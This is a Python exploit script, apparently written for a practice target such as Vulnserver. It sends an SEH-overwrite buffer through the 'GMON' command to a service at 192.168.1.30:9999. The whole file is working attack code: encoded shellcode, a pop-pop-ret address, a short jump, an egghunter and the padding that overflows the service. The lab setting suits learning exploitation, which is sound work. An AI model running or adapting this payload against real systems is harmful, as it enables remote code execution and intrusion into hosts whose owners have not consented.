import socket
import struct

s = socket.socket()
s.connect(('192.168.1.30',9999))

print(s.recv(1024))

total = 10000
offset = 3518

buf =  b""
buf += b"\xb8\x92\x50\x54\xd8\xdd\xc3\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x5e\x31\x46\x15\x03\x46\x15\x83\xee\xfc\xe2"
buf += b"\x67\xac\xbc\x57\x87\x4d\x3d\x08\xb6\x9f\xb4\x2d\xdc"
buf += b"\x94\x95\x9d\x97\xf9\x15\x55\xf5\xe9\x2a\xde\xb3\x37"
buf += b"\x04\xdf\xc8\x4a\x4e\x2e\x0e\x06\xb2\x31\xf2\x55\xe7"
buf += b"\x91\xcb\x95\xfa\xd0\x0c\x60\x70\x3c\xc0\x24\xf1\x90"
buf += b"\xf4\x41\x47\x29\xf5\x85\xc3\x11\x8d\xa0\x14\xe5\x21"
buf += b"\xaa\x44\x56\x32\xf4\x44\xdc\x0c\x1d\x84\x31\x09\xd4"
buf += b"\xf2\x89\x58\xd6\x05\x7a\x6e\x93\xfb\xab\xbf\x63\x3a"
buf += b"\x9c\xb2\xcf\xbc\xe4\xf4\xef\xca\x1e\x07\x8d\xcc\xe4"
buf += b"\x7a\x49\x58\xfb\xdc\x1a\xfa\xdf\xdd\xcf\x9d\x94\xd1"
buf += b"\xa4\xea\xf3\xf5\x3b\x3e\x88\x01\xb7\xc1\x5f\x80\x83"
buf += b"\xe5\x7b\xc9\x50\x87\xda\xb7\x37\xb8\x3d\x1f\xe7\x1c"
buf += b"\x35\x8d\xfe\x21\xb6\x4e\xff\x7f\x21\x83\x32\x80\xb1"
buf += b"\x8b\x45\xf3\x83\x14\xfe\x9b\xaf\xdd\xd8\x5c\xb9\xc9"
buf += b"\xda\xb3\x01\x99\x24\x34\x72\xb0\xe2\x60\x22\xaa\xc3"
buf += b"\x08\xa9\x2a\xeb\xdc\x44\x20\x7b\x1f\x30\x35\x75\xf7"
buf += b"\x43\x35\x98\x5b\xcd\xd3\xca\x33\x9d\x4b\xab\xe3\x5d"
buf += b"\x3b\x43\xee\x51\x64\x73\x11\xb8\x0d\x1e\xfe\x15\x66"
buf += b"\xb7\x67\x3c\xfc\x26\x67\xea\x79\x68\xe3\x1f\x7e\x27"
buf += b"\x04\x55\x6c\x50\x73\x95\x6c\xa1\x16\x95\x06\xa5\xb0"
buf += b"\xc2\xbe\xa7\xe5\x25\x61\x57\xc0\x35\x65\xa7\x95\x0f"
buf += b"\x1e\x9e\x03\x30\x48\xdf\xc3\xb0\x88\x89\x89\xb0\xe0"
buf += b"\x6d\xea\xe2\x15\x72\x27\x97\x86\xe7\xc8\xce\x7b\xaf"
buf += b"\xa0\xec\xa2\x87\x6e\x0e\x81\x9b\x69\xf0\x54\xb4\xd1"
buf += b"\x99\xa6\x84\xe1\x59\xcc\x04\xb2\x31\x1b\x2a\x3d\xf2"
buf += b"\xe4\xe1\x16\x9a\x6f\x64\xd4\x3b\x70\xad\xb8\xe5\x71"
buf += b"\x42\x61\x15\x08\x2b\x96\xd6\xed\x25\xf3\xd6\xee\x49"
buf += b"\x05\xea\x39\x70\x73\x2d\xfa\xc7\x9c\xb0\xd6\x3d\x35"
buf += b"\x6d\xb3\xff\x58\x8e\x6e\xc3\x64\x0d\x9a\xbc\x92\x0d"
buf += b"\xef\xb9\xdf\x89\x1c\xb0\x70\x7c\x22\x67\x70\x55"


shellcode = buf

ppr = struct.pack("<I",0x625010b4)
nop_sled = b'\x90'*20
jmp = b'\xeb\xcd\x90\x90'

egg = b'CAPTCAPT'

#!mona egg -t CAPT
egghunter = b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += b"\xef\xb8\x43\x41\x50\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

payload = [
    b'GMON /',
    egg,
    shellcode,
    b'\x90'*(offset-len(shellcode)-len(egg)-len(egghunter)),
    egghunter,
    jmp,
    ppr,
    b'Z'*(total-offset-len(jmp)-len(ppr)-len(nop_sled)-len(shellcode)-len(egg)-len(egghunter))

]

payload = b"".join(payload)

s.send(payload)
s.close()
